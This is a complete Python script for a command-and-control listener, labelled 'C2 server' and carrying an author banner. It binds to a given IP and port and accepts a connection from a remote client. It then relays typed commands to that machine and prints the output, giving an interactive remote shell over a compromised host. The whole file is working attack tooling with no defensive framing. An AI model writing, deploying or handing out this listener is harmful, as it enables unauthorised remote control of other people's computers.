import socket
import subprocess
import os
import argparse

def banner():
    print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
    print('╠═╝├┬┘│││││ │└─┐  ║  By Oliver Albertsen')
    print('╩  ┴└─┴┴ ┴└─┘└─┘  ╚═╝')

parser = argparse.ArgumentParser(description='C2 server ')
parser.add_argument('-ip', type=str, required=True, help='Input the listening IP ')
parser.add_argument('-p', type=int, required=True, help='Input the listening port ')

args = parser.parse_args()



def listener_handler(): # Function to handle incoming connections and send bytes over the socket
    sock.bind((host_ip, host_port))
    print('[+] Awaiting connection from client...')
    sock.listen()
    remote_target, remote_ip = sock.accept()
    comm_handler(remote_target, remote_ip)

def comm_in(remote_target):
    print(f'[+] Awaiting response...')
    response = remote_target.recv(1024).decode()
    return response

def comm_out(remote_target, message):
    remote_target.send(message.encode())

def comm_handler(remote_target, remote_ip):
    print(f'[+] Connection recived from {remote_ip[0]}')
    while True:
        try:
            message = input('#> ')
            if message == 'exit':
                remote_target.send(message.encode())
                remote_target.close()
                break
            remote_target.send(message.encode())
            response = remote_target.recv(1024).decode()
            if response == 'exit':
                print('[-] The client has terminated the session...')
                remote_target.close()
                break
            print(response)
        except KeyboardInterrupt:
            print(' [+] Keyboard interupt iniated...')
            remote_target.close()
            break
        except Exception:
            remote_target.close()
            break


   
if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = args.ip
    host_port = args.p
    banner()
    listener_handler()

